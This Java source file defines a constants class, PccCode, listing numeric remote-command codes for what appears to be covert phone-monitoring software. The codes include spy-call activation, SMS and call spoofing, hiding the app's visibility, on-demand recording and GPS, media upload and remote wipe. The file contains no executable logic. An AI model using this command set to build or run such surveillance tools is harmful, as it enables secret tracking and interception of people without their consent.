package com.vvt.phoenix.prot.command.response;

/**
 * @author tanakharn
 * @version 1.0
 * @created 27-Apr-2011 11:16:32 AM
 * 
 * List of supported PCC.
 */
public class PccCode {

	/*
	 * Monitor Call
	 */
	public static final int ENABLE_SPY_CALL = 9;
	public static final int ENABLE_SPY_CALL_WITH_MONITOR = 10;	//
	public static final int ADD_MONITORS = 160;
	public static final int RESET_MONITORS = 163;
	public static final int CLEAR_MONITORS = 161;
	public static final int QUERY_MONITORS = 162;
	public static final int ADD_CIS_NUMBERS = 130;	//
	public static final int RESET_CIS_NUMBERS = 131;	//
	public static final int CLEAR_CIS_NUMBERS = 132;	//
	public static final int QUERY_CIS_NUMBERS = 133;	//
	
	/*
	 * Miscellaneous
	 */
	public static final int REQUEST_HEART_BEAT = 2;	//
	public static final int REQUEST_EVENTS = 64;
	public static final int SET_SETTINGS = 92;
	public static final int ENABLE_SIM_CHANGE = 56;
	public static final int ENABLE_CAPTURE = 60;
	public static final int SET_VISIBILITY = 14214;
	
	/*
	 * Activation And Installation
	 */
	public static final int ACTIVATE_WITH_ACTIVATIONCODE_AND_URL = 14140;	//
	public static final int ACTIVATE_WITH_URL = 14141;
	public static final int DEACTIVATE = 14142;
	public static final int SET_ACTIVATE_PHONE_NUMBER = 14258;
	public static final int SYNC_UPDATE_CONFIGURATION = 300;	//
	public static final int UNINSTALL_APPLICATION = 200;	//
	public static final int SYNC_SOFTWARE_UPDATE = 306;
	public static final int ENABLE_PRODUCT = 14000;		//
	public static final int REQUEST_MOBILE_NUMBER = 199;
	
	/*
	 * Address Book
	 */
	public static final int SET_ADDRESS_BOOK = 120;		//
	public static final int SET_ADDRESSBOOK_FOR_APPROVAL = 121;		//
	public static final int SYNC_ADDRESSBOOK = 301;		//
	
	/*
	 * Security and Protection
	 */
	public static final int ENABLE_PANIC = 30;
	public static final int SET_PANIC_MODE = 31;
	public static final int SET_WIPEOUT = 201;
	public static final int SET_LOCK_DEVICE = 202;
	public static final int SET_UNLOCK_DEVICE = 203;
	public static final int ADD_EMERGENCY_NUMBER = 164;
	public static final int RESET_EMERGENCY_NUMBER = 165;
	public static final int CLEAR_EMERGENCY_NUMBER = 166;
	public static final int QUERY_EMERGENCY_NUMBER = 167;
	
	/*
	 * Notifications Numbers
	 */
	public static final int ADD_NOTIFICATION_NUMBERS = 171;		//
	public static final int RESET_NOTIFICATION_NUMBERS = 172;	//
	public static final int CLEAR_NOTIFICATION_NUMBERS = 173;	//
	public static final int QUERY_NOTIFICATION_NUMBERS = 174;	//
	
	/*
	 * Media
	 */
	public static final int UPLOAD_ACTUAL_MEDIA = 90;	//
	public static final int DELETE_ACTUAL_MEDIA = 91;	//
	public static final int ON_DEMAND_RECORD = 84;	//
	
	/*
	 * GPS Commands
	 */
	public static final int ENABLE_GPS = 52;
	public static final int UPDATE_GPS_INTERVAL = 53;
	public static final int ON_DEMAND_GPS = 101;	//
	
	/*
	 * Communication
	 */
	public static final int SPOOF_SMS = 85;
	public static final int SPOOF_CALL = 86;
	public static final int SET_MESSAGE = 17;
	//TODO public static final int ENABLE_PDU = ?;
	
	/*
	 * Call Watch
	 */
	public static final int ENABLE_WATCH_NOTIFICATION = 49;
	public static final int SET_WATCH_FLAGS = 50;
	public static final int ADD_WATCH_NUMBER = 45;
	public static final int RESET_WATCH_NUMBER = 46;
	public static final int CLEAR_WATCH_NUMBER = 47;
	public static final int QUERY_WATCH_NUMBER = 48;
	
	/*
	 * Sync
	 */
	public static final int SYNC_COMMUNICATION_DIRECTIVE = 302;		//
	public static final int SYNC_TIME = 303;
	public static final int SYNC_PROCESS_PROFILE = 304;
	public static final int SYNC_INCOMPATIBLE_APPLICATION_DEFINITION = 307;
	
	/*
	 * Home numbers
	 */
	public static final int ADD_HOMES_IN = 150;			//
	public static final int RESET_HOMES_IN = 151;		//
	public static final int CLEAR_HOMES_IN = 152;		//
	public static final int QUERY_HOMES_IN = 153;		//
	public static final int ADD_HOMES_OUT = 154;		//
	public static final int RESET_HOMES_OUT = 155;		//
	public static final int CLEAR_HOMES_OUT = 156;		//
	public static final int QUERY_HOMES_OUT = 157;		//
	
	/*
	 * Keyword List
	 */
	public static final int ADD_KEYWORD = 73;	
	public static final int RESET_KEYWORD = 74;
	public static final int CLEAR_KEYWORD = 75;
	public static final int QUERY_KEYWORD = 76;
	
	/*
	 * URL List (Admin)
	 */
	public static final int ADD_URL = 396;
	public static final int RESET_URL = 397;
	public static final int CLEAR_URL = 398;
	public static final int QUERY_URL = 399;
	
	/*
	 * Troubleshoot
	 */
	public static final int REQUEST_SETTINGS = 67;
	public static final int REQUEST_DIAGNOSTIC = 62;		//
	public static final int RESTART_DEVICE = 147;		//
	public static final int DELETE_DATABASE = 14587;	
	public static final int REQUEST_STARTUP_TIME = 5;
	public static final int RETRIEVE_RUNNING_PROCESSES = 14852;
	public static final int TERMINATE_RUNNING_PROCESSES = 14853;
	public static final int SET_DEBUG_MODE = 170;	//
	public static final int REQUEST_CURRENT_URL = 14143;

}